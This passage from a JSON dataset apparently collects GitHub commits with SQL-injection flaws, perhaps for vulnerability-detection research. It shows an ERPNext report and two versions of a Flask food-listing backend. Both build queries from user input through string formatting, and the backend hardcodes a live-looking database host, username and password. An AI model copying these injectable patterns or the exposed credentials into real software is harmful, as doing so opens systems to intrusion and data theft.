item_obj.item_group,\n\t\t\t\t\t\"item\": item_obj.name,\n\t\t\t\t\t\"item_name\": item_obj.item_name,\n\t\t\t\t\t\"customer\": item_obj.customer,\n\t\t\t\t\t\"last_order_date\": item_obj.last_order_date,\n\t\t\t\t\t\"qty\": item_obj.qty,\n\t\t\t\t\t\"days_since_last_order\": item_obj.days_since_last_order\n\t\t\t\t}\n\t\t\t\tdata.append(row)\n\t\telse:\n\t\t\trow = {\n\t\t\t\t\"item_group\": item.item_group,\n\t\t\t\t\"item\": item.name,\n\t\t\t\t\"item_name\": item.item_name\n\t\t\t}\n\t\t\tdata.append(row)\n\n\treturn data\n\n\ndef get_sales_details(filters):\n\n\tdata = []\n\titem_details_map = {}\n\n\tdate_field = \"s.transaction_date\" if filters[\"based_on\"] == \"Sales Order\" else \"s.posting_date\"\n\n\tsales_data = frappe.db.sql(\"\"\"\n\t\tselect s.territory, s.customer, si.item_group, si.item_name, si.qty, {date_field} as last_order_date,\n\t\tDATEDIFF(CURDATE(), {date_field}) as days_since_last_order\n\t\tfrom `tab{doctype}` s, `tab{doctype} Item` si\n\t\twhere s.name = si.parent and s.docstatus = 1\n\t\tgroup by si.name order by days_since_last_order \"\"\"\n\t\t.format(date_field = date_field, doctype = filters['based_on']), as_dict=1)\n\n\tfor d in sales_data:\n\t\titem_details_map.setdefault(d.item_name, d)\n\n\treturn item_details_map\n\ndef get_items(filters):\n\n\tfilters_dict = {\n\t\t\"disabled\": 0,\n\t\t\"is_stock_item\": 1\n\t}\n\n\tif filters.get(\"item_group\"):\n\t\tfilters_dict.update({\n\t\t\t\"item_group\": filters[\"item_group\"]\n\t\t})\n\n\tif filters.get(\"item\"):\n\t\tfilters_dict.update({\n\t\t\t\"name\": filters[\"item\"]\n\t\t})\n\n\titems = frappe.get_all(\"Item\", fields=[\"name\", \"item_group\", \"item_name\"], filters=filters_dict, order_by=\"name\")\n\n\treturn items\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/vinhnguyent090/erpnext_bellarma/blob/11e1c60cd3b235f3274fcc8359758b384ebe73dc",
        "file_path": "/erpnext/stock/report/inactive_items/inactive_items.py",
        "source": "# Copyright (c) 2013, Frappe Technologies Pvt. Ltd. and contributors\n# For license information, please see license.txt\n\nfrom __future__ import unicode_literals\nimport frappe\nfrom frappe.utils import getdate, add_days, today, cint\nfrom frappe import _\n\ndef execute(filters=None):\n\n\tcolumns = get_columns()\n\tdata = get_data(filters)\n\treturn columns, data\n\ndef get_columns():\n\n\tcolumns = [\n\t\t{\n\t\t\t\"fieldname\": \"territory\",\n\t\t\t\"fieldtype\": \"Link\",\n\t\t\t\"label\": _(\"Territory\"),\n\t\t\t\"options\": \"Territory\",\n\t\t\t\"width\": 100\n\t\t},\n\t\t{\n\t\t\t\"fieldname\": \"item_group\",\n\t\t\t\"fieldtype\": \"Link\",\n\t\t\t\"label\": _(\"Item Group\"),\n\t\t\t\"options\": \"Item Group\",\n\t\t\t\"width\": 150\n\t\t},\n\t\t{\n\t\t\t\"fieldname\": \"item_name\",\n\t\t\t\"fieldtype\": \"Link\",\n\t\t\t\"options\": \"Item\",\n\t\t\t\"label\": \"Item\",\n\t\t\t\"width\": 150\n\t\t},\n\t\t{\n\t\t\t\"fieldname\": \"item_name\",\n\t\t\t\"fieldtype\": \"Data\",\n\t\t\t\"label\": _(\"Item Name\"),\n\t\t\t\"width\": 150\n\t\t},\n\n\t\t{\n\t\t\t\"fieldname\": \"customer\",\n\t\t\t\"fieldtype\": \"Link\",\n\t\t\t\"label\": _(\"Customer\"),\n\t\t\t\"options\": \"Customer\",\n\t\t\t\"width\": 100\n\t\t},\n\t\t{\n\t\t\t\"fieldname\": \"last_order_date\",\n\t\t\t\"fieldtype\": \"Date\",\n\t\t\t\"label\": _(\"Last Order Date\"),\n\t\t\t\"width\": 100\n\t\t},\n\t\t{\n\t\t\t\"fieldname\": \"qty\",\n\t\t\t\"fieldtype\": \"Float\",\n\t\t\t\"label\": _(\"Quantity\"),\n\t\t\t\"width\": 100\n\t\t},\n\t\t{\n\t\t\t\"fieldname\": \"days_since_last_order\",\n\t\t\t\"fieldtype\": \"Int\",\n\t\t\t\"label\": _(\"Days Since Last Order\"),\n\t\t\t\"width\": 100\n\t\t},\n\t]\n\n\treturn columns\n\n\ndef get_data(filters):\n\n\tdata = []\n\titems = get_items(filters)\n\tsales_invoice_data = get_sales_details(filters)\n\n\tfor item in items:\n\t\tif sales_invoice_data.get(item.name):\n\t\t\titem_obj = sales_invoice_data[item.name]\n\t\t\tif item_obj.days_since_last_order > cint(filters['days']):\n\t\t\t\trow = {\n\t\t\t\t\t\"territory\": item_obj.territory,\n\t\t\t\t\t\"item_group\": item_obj.item_group,\n\t\t\t\t\t\"item\": item_obj.name,\n\t\t\t\t\t\"item_name\": item_obj.item_name,\n\t\t\t\t\t\"customer\": item_obj.customer,\n\t\t\t\t\t\"last_order_date\": item_obj.last_order_date,\n\t\t\t\t\t\"qty\": item_obj.qty,\n\t\t\t\t\t\"days_since_last_order\": item_obj.days_since_last_order\n\t\t\t\t}\n\t\t\t\tdata.append(row)\n\t\telse:\n\t\t\trow = {\n\t\t\t\t\"item_group\": item.item_group,\n\t\t\t\t\"item\": item.name,\n\t\t\t\t\"item_name\": item.item_name\n\t\t\t}\n\t\t\tdata.append(row)\n\n\treturn data\n\n\ndef get_sales_details(filters):\n\n\tdata = []\n\titem_details_map = {}\n\n\tdate_field = \"s.transaction_date\" if filters[\"based_on\"] == \"Sales Order\" else \"s.posting_date\"\n\n\tsales_data = frappe.db.sql(\"\"\"\n\t\tselect s.territory, s.customer, si.item_group, si.item_name, si.qty, {date_field} as last_order_date,\n\t\tDATEDIFF(CURDATE(), {date_field}) as days_since_last_order\n\t\tfrom `tab{doctype}` s, `tab{doctype} Item` si\n\t\twhere s.name = si.parent and s.docstatus = 1\n\t\tgroup by si.name order by days_since_last_order \"\"\"\n\t\t.format(date_field = date_field, doctype = filters['based_on']), as_dict=1)\n\n\tfor d in sales_data:\n\t\titem_details_map.setdefault(d.item_name, d)\n\n\treturn item_details_map\n\ndef get_items(filters):\n\n\tfilters_dict = {\n\t\t\"disabled\": 0,\n\t\t\"is_stock_item\": 1\n\t}\n\n\tif filters.get(\"item_group\"):\n\t\tfilters_dict.update({\n\t\t\t\"item_group\": filters[\"item_group\"]\n\t\t})\n\n\tif filters.get(\"item\"):\n\t\tfilters_dict.update({\n\t\t\t\"name\": filters[\"item\"]\n\t\t})\n\n\titems = frappe.get_all(\"Item\", fields=[\"name\", \"item_group\", \"item_name\"], filters=filters_dict, order_by=\"name\")\n\n\treturn items\n\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/yangray1/BreadWinner/blob/482b7fae69d2e02064ff55211c3f4ee5b214392e",
        "file_path": "/backend-api/backend-api.py",
        "source": "from flask import Flask\nfrom flask import request\nimport simplejson as json\nimport psycopg2\n\n\"\"\" Macros for relation and column names \"\"\"\nclient_table_name = \"\\\"Client\\\"\"\nclient_client_id_col = \"\\\"ClientID\\\"\"\nclient_client_rating_col = \"\\\"Client Rating\\\"\"\n\nclient_ratings_table_name = \"\\\"Client Ratings\\\"\"\nclient_ratings_client_id_col = \"\\\"ClientID\\\"\"\nclient_ratings_reviewer_id_col = \"\\\"ReviewerID\\\"\"\nclient_ratings_comments_col = \"\\\"Comments\\\"\"\nclient_ratings_rating_col = \"\\\"Rating\\\"\"\n\ncook_table_name = \"\\\"Cook\\\"\"\ncook_cook_id_col = \"\\\"CookID\\\"\"\ncook_cook_rating_col = \"\\\"Cook Rating\\\"\"\n\ncook_ratings_table_name = \"\\\"Cook Rating\\\"\"\ncook_ratings_cook_id_col = \"\\\"CookID\\\"\"\ncook_ratings_reviewer_id_col = \"\\\"ReviewerID\\\"\"\ncook_ratings_comments_col = \"\\\"Comments\\\"\"\ncook_ratings_rating_col = \"\\\"Rating\\\"\"\n\nlisting_table_name = \"\\\"Listing\\\"\"\nlisting_listing_id_col = \"\\\"ListingID\\\"\"\nlisting_cook_id_col = \"\\\"CookID\\\"\"\nlisting_food_name_col = \"\\\"Food Name\\\"\"\nlisting_price_col = \"\\\"Price\\\"\"\nlisting_location_col = \"\\\"Location\\\"\"\nlisting_image_col = \"\\\"Image\\\"\"\n\nlisting_tags_table_name = \"\\\"Listing Tags\\\"\"\nlisting_tags_listing_id_col = \"\\\"ListingID\\\"\"\nlisting_tags_tag_col = \"\\\"Tag\\\"\"\n\norder_table_name = \"\\\"Order\\\"\"\norder_client_id_col = \"\\\"ClientID\\\"\"\norder_listing_id_col = \"\\\"ListingID\\\"\"\norder_status_col = \"\\\"Status\\\"\"\norder_time_of_order_col = \"\\\"Time of Order\\\"\"\n\nuser_table_name = \"\\\"User\\\"\"\nuser_user_id_col = \"\\\"UserID\\\"\"\nuser_password_col = \"\\\"Password\\\"\"\nuser_fname_col = \"\\\"FName\\\"\"\nuser_lname_col = \"\\\"LName\\\"\"\n\n\"\"\" Database login details \"\"\"\ndb_host = \"mydbinstance.cqzm55sjgiup.us-east-1.rds.amazonaws.com\"\ndb_name = \"csc301breadwiener\"\ndb_user = \"csc301breadwiener\"\ndb_password = \"team7ithink\"\n\nconn = psycopg2.connect(host=db_host, database=db_name, user=db_user, password=db_password)\napp = Flask(__name__)\n\n##################################################\ndef removeQuotes(stringy):\n    \"\"\" Removes the first and last characters (double quotes) from a string, and then return it \"\"\"\n    return stringy[1:-1]\n\n\n#--------------------------------------------------- GET ALL LISTINGS ---------------------------------------------------#\n@app.route('/api/getAllListings', methods=['GET'])\ndef getAllListings():\n    all_rows = []\n\n    search_all = conn.cursor()\n    search_all.execute(\"SELECT {}, {}, {}, {},\"\n                         \" {}, {} FROM public.{}\".format(listing_listing_id_col,\n                                                                          listing_cook_id_col,\n                                                                          listing_food_name_col,\n                                                                          listing_price_col,\n                                                                          listing_location_col,\n                                                                          listing_image_col,\n                                                                          listing_table_name))\n\n    single_row = search_all.fetchone()\n\n    while single_row is not None:\n        all_rows.append(single_row)\n        single_row = search_all.fetchone()\n\n    search_all.close()\n\n    rows_to_json(all_rows)  # want to convert each row into a JSON string\n\n    return json.dumps({'data': all_rows})  # convert to string before returning\n\n\n#--------------------------------------------------- ADD LISTING ---------------------------------------------------#\n\n@app.route('/api/add', methods=['GET', 'POST'])\ndef addReq():\n    if request.method == \"GET\":\n        return printTables()\n    elif request.method == \"POST\":\n        addToDB(request.get_json())\n        conn.commit()\n        return \"Success\"\n\ndef encase_in_quotes(stringy):\n    return \"\\\"\" + stringy + \"\\\"\"\n\n\n\"\"\"\nAdds the Listing entry to the PSQL database with the given JSONdata\nJSON format is a dictionary where the keys are the column names of the listing, along with\na key \"tagList\" which is a list of tags:\n\n\"\"\"\n\n\ndef addToDB(json_data):\n    cur = conn.cursor()\n    json_dict = json_data\n\n    list_id = getListId()\n    cook_id = json_dict[removeQuotes(listing_cook_id_col)]\n    food_name = json_dict[removeQuotes(listing_food_name_col)]\n    price = json_dict[removeQuotes(listing_price_col)]\n    loc = json_dict[removeQuotes(listing_location_col)]\n    image = json_dict[removeQuotes(listing_image_col)]\n    tags = json_dict[\"tags\"]\n\n    inserted = (list_id, cook_id, food_name, price, loc, image)\n    #inserted = '(' + list_id + ',' + cook_id + ',' + food_name + ',' + price + ',' + loc + ',' + image + ')'\n\n    sql = \"INSERT INTO {} VALUES {}\".format(listing_table_name, str(inserted).encode(\"ascii\", \"replace\"))\n    cur.execute(sql)\n\n    addTags(tags, list_id)\n\n\ndef addTags(tag_list, listing_id):\n    \"\"\"\n    Adds a list of tags tag_list for a given listing with listing_id to the database\n    \"\"\"\n    cur = conn.cursor()\n    for x in tag_list:\n        sql = \"INSERT INTO {} VALUES {}\".format(listing_tags_table_name, str((listing_id, x)))\n        cur.execute(sql)\n\n\ndef getListId():\n    \"\"\" Returns an unused listing_id \"\"\"\n    cur = conn.cursor()\n    sql = \"SELECT max({}) FROM {}\".format(listing_listing_id_col,\n                                          listing_table_name)\n    cur.execute(sql)\n    maxID = cur.fetchone()\n    if maxID[0] == None:\n        return 1\n    else:\n        return maxID[0] + 1\n\n\ndef printTables():\n    cur = conn.cursor()\n    strout = \"--------------------------ListingTable---------------------------<br>\"\n    sql = \"SELECT * FROM {}\".format(listing_table_name)\n    cur.execute(sql)\n    listings = cur.fetchall()\n    for x in listings:\n        for y in x:\n            strout = strout + str(y) + \"||\t\"\n        strout = strout + \"<br>\"\n    sql = \"SELECT * FROM {}\".format(listing_tags_table_name)\n    cur.execute(sql)\n    listings = cur.fetchall()\n    strout += \"<br><br><br>--------------------------TagTable-------------------------<br>\"\n    for x in listings:\n        for y in x:\n            strout = strout + str(y) + \"\t\"\n\n        strout = strout + \"<br>\"\n    return strout\n\n\n#--------------------------------------------------- CANCEL ---------------------------------------------------#\n\n\n@app.route('/api/cancel/<int:clientId>/<int:listingId>', methods=['GET'])\ndef cancel(clientId, listingId):\n    \"\"\"\n    Cancels the order with specified client id and listing id and returns it.\n    returns 'order not found' if the client id and listing id do not exist as a key or if the listing has already\n    been canceled or fulfilled.\n    \"\"\"\n\n    in_progress = get_in_progress_order(clientId, listingId)\n\n    if in_progress:\n        cancel_order(clientId, listingId)\n        output = order_to_json(in_progress)  # want to convert each row into a JSON string\n\n        return output  # convert to string before returning\n    else:\n        return 'order not found'\n\n\ndef get_in_progress_order(clientId, listingId):\n    \"\"\"\n    Return the in progress order that corresponds with ClientId and ListingID\n    \"\"\"\n    matched_rows = []\n\n    order = conn.cursor()\n    order.execute(\"SELECT t1.\\\"ClientID\\\", t1.\\\"ListingID\\\", t1.\\\"Status\\\", t1.\\\"Time of Order\\\" from public.\\\"Order\\\"\"\n                  \" as t1 WHERE t1.\\\"ClientID\\\" = \" + str(clientId) + \" AND \\\"ListingID\\\" = \" + str(listingId) +\n                  \" AND t1.\\\"Status\\\" = \\'In progress\\'\")\n\n    order_row = order.fetchone()\n\n    while order_row is not None:\n        matched_rows.append(order_row)\n        order_row = order.fetchone()\n\n    order.close()\n\n    return matched_rows\n\n\ndef cancel_order(clientId, listingId):\n    \"\"\"\n    given a clientId and listingId cancel the order in progress associated with them\n    \"\"\"\n    order = conn.cursor()\n    order.execute(\n        \"UPDATE public.\\\"Order\\\" SET \\\"Status\\\" = 'Canceled' WHERE \\\"ClientID\\\" = \" + str(clientId) +\n        \" AND \\\"ListingID\\\" = \" + str(listingId) + \" AND \\\"Status\\\" = \\'In progress\\'\")\n    conn.commit()\n\n    order.close()\n\n\ndef order_to_json(rows):\n    \"\"\"\n    Takes in a list of tupples for the Orders schema and returns a json formated representation of the data.\n    \"\"\"\n    string = \"\"\n    for i in range(len(rows)):\n        string += json.dumps({'ClientID': rows[i][0],\n                              'ListingID': rows[i][1],\n                              'Status': rows[i][2],\n                              'DateTime': rows[i][3].__str__()})\n        if i != len(rows) - 1:\n            string += \",\"\n\n    return string\n\n\n#--------------------------------------------------- getUserOrders ---------------------------------------------------#\n\n\n@app.route('/api/getUserOrders/<int:clientId>', methods=['GET'])\ndef getUserOrders(clientId):\n    \"\"\"\n    Retruns a list of jsons representing tupples in the Orders table for the given client\n    \"\"\"\n\n    in_progress = queryOrderUsingClientID(clientId)\n\n    output = order_to_json(in_progress)  # want to convert each row into a JSON string\n\n    return \"[\" + output + \"]\"  # convert to string before returning\n\n\ndef queryOrderUsingClientID(clientId):\n    \"\"\"\n    Return a list of Order tuples belonging to the client with the given id.\n    \"\"\"\n    matched_rows = []\n\n    orders = conn.cursor()\n    orders.execute(\"SELECT t1.\\\"ClientID\\\", t1.\\\"ListingID\\\", t1.\\\"Status\\\", t1.\\\"Time of Order\\\" from public.\\\"Order\\\"\"\n                   \" as t1 WHERE t1.\\\"ClientID\\\" = \" + str(clientId))\n\n    order_row = orders.fetchone()\n\n    while order_row is not None:\n        matched_rows.append(order_row)\n        order_row = orders.fetchone()\n\n    orders.close()\n\n    return matched_rows\n\n\n#--------------------------------------------------- MARK AS COMPLETE ---------------------------------------------------#\n\n\ncompleted = \"\\'Completed\\'\"\n\n\n@app.route(\"/api/markComplete/<int:clientID>/<int:listingID>\", methods=['GET'])\ndef mark_as_complete(clientID, listingID):\n    \"\"\" A function that changes the status of the order with listing id listing_id to complete.\n        Returns \"Success\" on a sucessful change of the listing id's order to complete.\n\n        @param clientID: the client id number to change the status.\n        @param listingID: the listing id number to change the status.\n        @rtype: str\n    \"\"\"\n\n    sql = \\\n        \"\"\"\n            UPDATE public.{}\n            SET {} = {}\n            WHERE {} = {} AND {} = {}\n        \"\"\".format(order_table_name, order_status_col, completed, order_listing_id_col, str(listingID),\n                   order_client_id_col, str(clientID))\n\n    cur = conn.cursor()\n    try:\n        cur.execute(sql)\n        conn.commit()\n    except Exception as e:\n        raise Exception(e)\n\n    # Check to see if a row in the database has been updated.\n    if cur.rowcount == 0:\n        raise Exception(\"The status of listing id's order was not changed. ClientID or ListingID may be out of range.\")\n    return \"Success\"\n\n\n#--------------------------------------------------- SEARCH ---------------------------------------------------#\n\n\n@app.route('/api/search/<string:search_query>', methods=['GET'])\ndef search(search_query):\n    \"\"\"\n    Return a string representation of a list of JSON objects. This list contains\n    objects that correspond to listings that match names or tags in the search query.\n    \"\"\"\n    # separate words in search_query with '+' in place of spaces\n    search_terms = search_query.split('+')\n\n    # want to remove whitespace and empty elements from the list\n    search_terms_filtered = []\n\n    for search_term in search_terms:\n        if not search_term.isspace() and not search_term == '':\n            search_terms_filtered.append(search_term)\n\n    matched_rows_by_name = get_rows_from_name(search_terms_filtered)\n\n    matched_rows_by_tag = get_rows_from_tag(search_terms_filtered)\n\n    matched_rows = matched_rows_by_name + matched_rows_by_tag\n\n    unique_matched_rows = list(set(matched_rows))  # remove duplicate rows\n\n    rows_to_json(unique_matched_rows)  # want to convert each row into a JSON string\n\n    return json.dumps({'data': unique_matched_rows})  # convert to string before returning\n\n\ndef get_rows_from_name(search_terms):\n    \"\"\"\n    Return a list of listing tuples whose Food Names correspond to words in search_terms.\n    \"\"\"\n    matched_rows = []\n\n    for search_term in search_terms:\n        search_names = conn.cursor()\n        search_names.execute(\"SELECT t1.{}, t1.{}, t1.{}, t1.{},\"\n                             \" t1.{}, t1.{} FROM public.{} as t1\"\n                             \" FULL OUTER JOIN public.{} as t2 ON t1.{} = t2.{} \"\n                             \"WHERE UPPER(t1.{}) LIKE UPPER(\\'%{}%\\')\".format(listing_listing_id_col,\n                                                                              listing_cook_id_col,\n                                                                              listing_food_name_col,\n                                                                              listing_price_col,\n                                                                              listing_location_col,\n                                                                              listing_image_col,\n                                                                              listing_table_name,\n                                                                              listing_tags_table_name,\n                                                                              listing_listing_id_col,\n                                                                              listing_tags_listing_id_col,\n                                                                              listing_food_name_col,\n                                                                              search_term))\n\n        search_names_row = search_names.fetchone()\n\n        while search_names_row is not None:\n            matched_rows.append(search_names_row)\n            search_names_row = search_names.fetchone()\n\n        search_names.close()\n\n    return matched_rows\n\n\ndef get_rows_from_tag(search_terms):\n    \"\"\"\n    Return a list of listing tuples whose tags correspond to words in search_terms.\n    \"\"\"\n    matched_rows = []\n\n    for search_term in search_terms:\n        search_tags = conn.cursor()\n        search_tags.execute(\"SELECT t1.{}, t1.{}, t1.{}, t1.{},\"\n                             \" t1.{}, t1.{} FROM public.{} as t1\"\n                             \" FULL OUTER JOIN public.{} as t2 ON t1.{} = t2.{} \"\n                             \"WHERE UPPER(t2.{}) LIKE UPPER(\\'%{}%\\')\".format(listing_listing_id_col,\n                                                                              listing_cook_id_col,\n                                                                              listing_food_name_col,\n                                                                              listing_price_col,\n                                                                              listing_location_col,\n                                                                              listing_image_col,\n                                                                              listing_table_name,\n                                                                              listing_tags_table_name,\n                                                                              listing_listing_id_col,\n                                                                              listing_tags_listing_id_col,\n                                                                              listing_tags_tag_col,\n                                                                              search_term))\n\n        search_tags_row = search_tags.fetchone()\n\n        while search_tags_row is not None:\n            matched_rows.append(search_tags_row)\n            search_tags_row = search_tags.fetchone()\n\n        search_tags.close()\n\n    return matched_rows\n\n\ndef rows_to_json(rows):\n    \"\"\"\n    Mutate rows such that each tuple in rows is converted to a JSON string representing the same information.\n    \"\"\"\n    for i in range(len(rows)):\n        rows[i] = json.dumps({'ListingID': rows[i][0],\n                                'CookID': rows[i][1],\n                                'Food Name': rows[i][2],\n                                'Price': rows[i][3],\n                                'Location': rows[i][4],\n                                'Image': rows[i][5]})\n\n\nif __name__ == '__main__':\n    app.run(host=\"0.0.0.0\", port=80)\n    # host=\"0.0.0.0\", port=80\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/yangray1/BreadWinner/blob/a5c2c0b8d137ca3f1859ce7b65c39b7d461bf615",
        "file_path": "/backend-api/backend-api.py",
        "source": "from flask import Flask\nfrom flask import request\nimport simplejson as json\nimport psycopg2\n\n\"\"\" Macros for relation and column names \"\"\"\nclient_table_name = \"\\\"Client\\\"\"\nclient_client_id_col = \"\\\"ClientID\\\"\"\nclient_client_rating_col = \"\\\"Client Rating\\\"\"\n\nclient_ratings_table_name = \"\\\"Client Ratings\\\"\"\nclient_ratings_client_id_col = \"\\\"ClientID\\\"\"\nclient_ratings_reviewer_id_col = \"\\\"ReviewerID\\\"\"\nclient_ratings_comments_col = \"\\\"Comments\\\"\"\nclient_ratings_rating_col = \"\\\"Rating\\\"\"\n\ncook_table_name = \"\\\"Cook\\\"\"\ncook_cook_id_col = \"\\\"CookID\\\"\"\ncook_cook_rating_col = \"\\\"Cook Rating\\\"\"\n\ncook_ratings_table_name = \"\\\"Cook Rating\\\"\"\ncook_ratings_cook_id_col = \"\\\"CookID\\\"\"\ncook_ratings_reviewer_id_col = \"\\\"ReviewerID\\\"\"\ncook_ratings_comments_col = \"\\\"Comments\\\"\"\ncook_ratings_rating_col = \"\\\"Rating\\\"\"\n\nlisting_table_name = \"\\\"Listing\\\"\"\nlisting_listing_id_col = \"\\\"ListingID\\\"\"\nlisting_cook_id_col = \"\\\"CookID\\\"\"\nlisting_food_name_col = \"\\\"Food Name\\\"\"\nlisting_price_col = \"\\\"Price\\\"\"\nlisting_location_col = \"\\\"Location\\\"\"\nlisting_image_col = \"\\\"Image\\\"\"\n\nlisting_tags_table_name = \"\\\"Listing Tags\\\"\"\nlisting_tags_listing_id_col = \"\\\"ListingID\\\"\"\nlisting_tags_tag_col = \"\\\"Tag\\\"\"\n\norder_table_name = \"\\\"Order\\\"\"\norder_client_id_col = \"\\\"ClientID\\\"\"\norder_listing_id_col = \"\\\"ListingID\\\"\"\norder_status_col = \"\\\"Status\\\"\"\norder_time_of_order_col = \"\\\"Time of Order\\\"\"\n\nuser_table_name = \"\\\"User\\\"\"\nuser_user_id_col = \"\\\"UserID\\\"\"\nuser_password_col = \"\\\"Password\\\"\"\nuser_fname_col = \"\\\"FName\\\"\"\nuser_lname_col = \"\\\"LName\\\"\"\n\n\"\"\" Database login details \"\"\"\ndb_host = \"mydbinstance.cqzm55sjgiup.us-east-1.rds.amazonaws.com\"\ndb_name = \"csc301breadwiener\"\ndb_user = \"csc301breadwiener\"\ndb_password = \"team7ithink\"\n\nconn = psycopg2.connect(host=db_host, database=db_name, user=db_user, password=db_password)\napp = Flask(__name__)\n\n##################################################\ndef removeQuotes(stringy):\n    \"\"\" Removes the first and last characters (double quotes) from a string, and then return it \"\"\"\n    return stringy[1:-1]\n\n\n#--------------------------------------------------- GET ALL LISTINGS ---------------------------------------------------#\n@app.route('/api/getAllListings', methods=['GET'])\ndef getAllListings():\n    all_rows = []\n\n    search_all = conn.cursor()\n    search_all.execute(\"SELECT {}, {}, {}, {},\"\n                         \" {}, {} FROM public.{}\".format(listing_listing_id_col,\n                                                                          listing_cook_id_col,\n                                                                          listing_food_name_col,\n                                                                          listing_price_col,\n                                                                          listing_location_col,\n                                                                          listing_image_col,\n                                                                          listing_table_name))\n\n    single_row = search_all.fetchone()\n\n    while single_row is not None:\n        all_rows.append(single_row)\n        single_row = search_all.fetchone()\n\n    search_all.close()\n\n    rows_to_json(all_rows)  # want to convert each row into a JSON string\n\n    return json.dumps({'data': all_rows})  # convert to string before returning\n\n\n#--------------------------------------------------- ADD LISTING ---------------------------------------------------#\n\n@app.route('/api/add', methods=['GET', 'POST'])\ndef addReq():\n    if request.method == \"GET\":\n        return printTables()\n    elif request.method == \"POST\":\n        addToDB(request.get_json())\n        conn.commit()\n        return \"Success\"\n\ndef encase_in_quotes(stringy):\n    return \"\\\"\" + stringy + \"\\\"\"\n\n\n\"\"\"\nAdds the Listing entry to the PSQL database with the given JSONdata\nJSON format is a dictionary where the keys are the column names of the listing, along with\na key \"tagList\" which is a list of tags:\n\n\"\"\"\n\n\ndef addToDB(json_data):\n    cur = conn.cursor()\n    json_dict = json_data\n\n    list_id = getListId()\n    cook_id = json_dict[removeQuotes(listing_cook_id_col)]\n    food_name = json_dict[removeQuotes(listing_food_name_col)]\n    price = json_dict[removeQuotes(listing_price_col)]\n    loc = json_dict[removeQuotes(listing_location_col)]\n    image = json_dict[removeQuotes(listing_image_col)]\n    tags = json_dict[\"tags\"]\n\n    sql = \"INSERT INTO %s VALUES (%s, %s, %s, %s, %s, %s)\"\n\tcur.execute(sql, (listing_table_name, list_id, cook_id, food_name, price, loc, image))\n\n    addTags(tags, list_id)\n\n\ndef addTags(tag_list, listing_id):\n    \"\"\"\n    Adds a list of tags tag_list for a given listing with listing_id to the database\n    \"\"\"\n    cur = conn.cursor()\n    for x in tag_list:\n        sql = \"INSERT INTO {} VALUES {}\".format(listing_tags_table_name, str((listing_id, x)))\n        cur.execute(sql)\n\n\ndef getListId():\n    \"\"\" Returns an unused listing_id \"\"\"\n    cur = conn.cursor()\n    sql = \"SELECT max({}) FROM {}\".format(listing_listing_id_col,\n                                          listing_table_name)\n    cur.execute(sql)\n    maxID = cur.fetchone()\n    if maxID[0] == None:\n        return 1\n    else:\n        return maxID[0] + 1\n\n\ndef printTables():\n    cur = conn.cursor()\n    strout = \"--------------------------ListingTable---------------------------<br>\"\n    sql = \"SELECT * FROM {}\".format(listing_table_name)\n    cur.execute(sql)\n    listings = cur.fetchall()\n    for x in listings:\n        for y in x:\n            strout = strout + str(y) + \"||\t\"\n        strout = strout + \"<br>\"\n    sql = \"SELECT * FROM {}\".format(listing_tags_table_name)\n    cur.execute(sql)\n    listings = cur.fetchall()\n    strout += \"<br><br><br>--------------------------TagTable-------------------------<br>\"\n    for x in listings:\n        for y in x:\n            strout = strout + str(y) + \"\t\"\n\n        strout = strout + \"<br>\"\n    return strout\n\n\n#--------------------------------------------------- CANCEL ---------------------------------------------------#\n\n\n@app.route('/api/cancel/<int:clientId>/<int:listingId>', methods=['GET'])\ndef cancel(clientId, listingId):\n    \"\"\"\n    Cancels the order with specified client id and listing id and returns it.\n    returns 'order not found' if the client id and listing id do not exist as a key or if the listing has already\n    been canceled or fulfilled.\n    \"\"\"\n\n    in_progress = get_in_progress_order(clientId, listingId)\n\n    if in_progress:\n        cancel_order(clientId, listingId)\n        output = order_to_json(in_progress)  # want to convert each row into a JSON string\n\n        return output  # convert to string before returning\n    else:\n        return 'order not found'\n\n\ndef get_in_progress_order(clientId, listingId):\n    \"\"\"\n    Return the in progress order that corresponds with ClientId and ListingID\n    \"\"\"\n    matched_rows = []\n\n    order = conn.cursor()\n    order.execute(\"SELECT t1.\\\"ClientID\\\", t1.\\\"ListingID\\\", t1.\\\"Status\\\", t1.\\\"Time of Order\\\" from public.\\\"Order\\\"\"\n                  \" as t1 WHERE t1.\\\"ClientID\\\" = \" + str(clientId) + \" AND \\\"ListingID\\\" = \" + str(listingId) +\n                  \" AND t1.\\\"Status\\\" = \\'In progress\\'\")\n\n    order_row = order.fetchone()\n\n    while order_row is not None:\n        matched_rows.append(order_row)\n        order_row = order.fetchone()\n\n    order.close()\n\n    return matched_rows\n\n\ndef cancel_order(clientId, listingId):\n    \"\"\"\n    given a clientId and listingId cancel the order in progress associated with them\n    \"\"\"\n    order = conn.cursor()\n    order.execute(\n        \"UPDATE public.\\\"Order\\\" SET \\\"Status\\\" = 'Canceled' WHERE \\\"ClientID\\\" = \" + str(clientId) +\n        \" AND \\\"ListingID\\\" = \" + str(listingId) + \" AND \\\"Status\\\" = \\'In progress\\'\")\n    conn.commit()\n\n    order.close()\n\n\ndef order_to_json(rows):\n    \"\"\"\n    Takes in a list of tupples for the Orders schema and returns a json formated representation of the data.\n    \"\"\"\n    string = \"\"\n    for i in range(len(rows)):\n        string += json.dumps({'ClientID': rows[i][0],\n                              'ListingID': rows[i][1],\n                              'Status': rows[i][2],\n                              'DateTime': rows[i][3].__str__()})\n        if i != len(rows) - 1:\n            string += \",\"\n\n    return string\n\n\n#--------------------------------------------------- getUserOrders ---------------------------------------------------#\n\n\n@app.route('/api/getUserOrders/<int:clientId>', methods=['GET'])\ndef getUserOrders(clientId):\n    \"\"\"\n    Retruns a list of jsons representing tupples in the Orders table for the given client\n    \"\"\"\n\n    in_progress = queryOrderUsingClientID(clientId)\n\n    output = order_to_json(in_progress)  # want to convert each row into a JSON string\n\n    return \"[\" + output + \"]\"  # convert to string before returning\n\n\ndef queryOrderUsingClientID(clientId):\n    \"\"\"\n    Return a list of Order tuples belonging to the client with the given id.\n    \"\"\"\n    matched_rows = []\n\n    orders = conn.cursor()\n    orders.execute(\"SELECT t1.\\\"ClientID\\\", t1.\\\"ListingID\\\", t1.\\\"Status\\\", t1.\\\"Time of Order\\\" from public.\\\"Order\\\"\"\n                   \" as t1 WHERE t1.\\\"ClientID\\\" = \" + str(clientId))\n\n    order_row = orders.fetchone()\n\n    while order_row is not None:\n        matched_rows.append(order_row)\n        order_row = orders.fetchone()\n\n    orders.close()\n\n    return matched_rows\n\n\n#--------------------------------------------------- MARK AS COMPLETE 